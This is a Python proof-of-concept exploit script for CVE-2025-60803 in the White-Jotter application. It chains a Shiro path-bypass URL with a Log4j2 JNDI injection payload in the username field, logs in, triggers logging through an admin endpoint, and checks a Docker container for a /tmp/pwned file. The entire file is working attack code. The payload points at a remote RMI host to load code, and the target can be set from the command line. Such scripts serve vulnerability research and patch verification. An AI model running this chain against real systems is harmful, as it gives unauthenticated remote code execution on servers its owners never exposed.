#!/usr/bin/env python3
"""
CVE-2025-60803 - White-Jotter Unauthenticated RCE via Log4j2 JNDI Injection

Vulnerability Chain:
1. Shiro path bypass using /api/aaa;/../register
2. Register user with JNDI payload as username
3. Login with malicious username to get session
4. Access admin endpoint to trigger Log4j2 logging with JNDI payload

Reference: https://github.com/Antabot/White-Jotter/issues/162
"""
import requests
import sys
import time
import subprocess

TARGET = "http://localhost:8444"
JNDI_HOST = "whitejotter-jndi"

def step1_register_malicious_user(target, jndi_payload):
    url = f"{target}/api/aaa;/../register"
    
    data = {
        "username": jndi_payload,
        "password": "111",
        "name": "111",
        "phone": "111",
        "email": "111@qq.com"
    }
    
    headers = {"Content-Type": "application/json;charset=utf-8"}
    
    print(f"[*] Step 1: Registering malicious user via Shiro bypass")
    print(f"[*] URL: {url}")
    print(f"[*] Username (JNDI payload): {jndi_payload}")
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        print(f"[*] Response: {response.status_code} - {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def step2_login_get_session(target, jndi_payload):
    url = f"{target}/api/login"
    
    data = {
        "username": jndi_payload,
        "password": "111"
    }
    
    headers = {"Content-Type": "application/json;charset=utf-8"}
    
    print(f"\n[*] Step 2: Logging in with malicious username")
    print(f"[*] URL: {url}")
    
    try:
        session = requests.Session()
        response = session.post(url, json=data, headers=headers, timeout=10)
        print(f"[*] Response: {response.status_code} - {response.text}")
        
        cookies = session.cookies.get_dict()
        print(f"[*] Cookies: {cookies}")
        
        return session if response.status_code == 200 else None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def step3_trigger_log4j(session, target):
    url = f"{target}/api/admin/content/article"
    
    print(f"\n[*] Step 3: Triggering Log4j2 JNDI injection")
    print(f"[*] URL: {url}")
    print(f"[*] Accessing admin endpoint without permission triggers logging")
    print(f"[*] Log4j2 will resolve JNDI expression in username")
    
    try:
        response = session.get(url, timeout=10)
        print(f"[*] Response: {response.status_code}")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def verify_rce():
    print(f"\n[*] Step 4: Verifying RCE execution")
    print(f"[*] Checking if /tmp/pwned was created in backend container")
    
    time.sleep(5)
    
    result = subprocess.run(
        ["docker", "exec", "whitejotter-backend", "ls", "-la", "/tmp/pwned"],
        capture_output=True,
        text=True
    )
    
    if result.returncode == 0:
        print(f"[+] SUCCESS: /tmp/pwned exists!")
        print(f"[+] {result.stdout.strip()}")
        return True
    else:
        print(f"[-] File not found: {result.stderr.strip()}")
        return False

def main():
    print("""
    CVE-2025-60803 - White-Jotter Unauthenticated RCE PoC
    =====================================================
    Vulnerability: Shiro Bypass + Log4j2 JNDI Injection
    Reference: https://github.com/Antabot/White-Jotter/issues/162
    """)
    
    target = TARGET
    if len(sys.argv) > 1:
        target = sys.argv[1]
    
    jndi_payload = f"${{jndi:rmi://{JNDI_HOST}:1099/dpzzbb}}"
    
    print(f"[*] Target: {target}")
    print(f"[*] JNDI Payload: {jndi_payload}")
    print(f"[*] JNDI Server: {JNDI_HOST}")
    print("=" * 60)
    
    if not step1_register_malicious_user(target, jndi_payload):
        print("[-] Failed to register malicious user")
        return 1
    
    session = step2_login_get_session(target, jndi_payload)
    if not session:
        print("[-] Failed to login")
        return 1
    
    step3_trigger_log4j(session, target)
    
    success = verify_rce()
    
    print("\n" + "=" * 60)
    if success:
        print("[+] VULNERABILITY CONFIRMED: CVE-2025-60803")
        print("[+] Log4j2 JNDI injection via Shiro bypass successful!")
    else:
        print("[-] RCE verification failed")
        print("[!] Note: JNDI exploitation depends on JDK version and network")
        print("[!] The vulnerability may still exist even if RCE wasn't triggered")
    print("=" * 60)
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
